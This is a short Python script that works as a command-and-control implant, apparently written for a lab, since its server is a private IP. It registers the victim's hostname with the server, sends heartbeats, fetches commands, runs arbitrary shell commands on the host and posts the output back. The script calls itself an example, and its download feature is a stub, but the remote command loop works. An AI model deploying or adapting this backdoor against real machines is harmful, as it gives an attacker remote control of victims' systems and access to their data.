
import requests
import subprocess
import time
import os
import sys
import json
from datetime import datetime

C2_SERVER = "http://192.168.56.101:5000" 

def get_system_info():
    try:
        hostname = os.getenv('COMPUTERNAME', 'Unknown')
    except:
        hostname = 'Unknown'
    return hostname

def register_with_c2():
    hostname = get_system_info()
    data = {'hostname': hostname}
    try:
        response = requests.post(f'{C2_SERVER}/register', json=data, timeout=10)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def send_heartbeat():
    try:
        requests.post(f'{C2_SERVER}/heartbeat', timeout=5)
    except requests.exceptions.RequestException:
        pass

def get_command():
    try:
        response = requests.get(f'{C2_SERVER}/get_command', timeout=10)
        if response.status_code == 200:
            return response.json()
    except requests.exceptions.RequestException:
        pass
    return None

def submit_result(result):
    data = {'result': result}
    try:
        requests.post(f'{C2_SERVER}/submit_result', json=data, timeout=10)
    except requests.exceptions.RequestException:
        pass

def execute_command(cmd_data):
    command = cmd_data.get('command')
    data = cmd_data.get('data')
    result = "No command executed."

    if command == 'execute':
    
        try:
            result = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL).decode('utf-8', errors='ignore')
        except Exception as e:
            result = f"Command failed: {e}"
    
    elif command == 'info':
    
        result = f"Hostname: {get_system_info()}\nCurrent Time: {datetime.now()}"
    
    elif command == 'download':
    
    
        result = "Download command received but not implemented in this example."

    elif command == 'idle':
        result = "Received idle command."

    return result

def main():

    if not register_with_c2():
    
        time.sleep(60)
    

    while True:
        send_heartbeat() 
        
        cmd = get_command()
        if cmd:
            print(f"[+] Received command: {cmd['command']}")
            result = execute_command(cmd)
            submit_result(result)
        
        time.sleep(30) 

if __name__ == '__main__':
    main()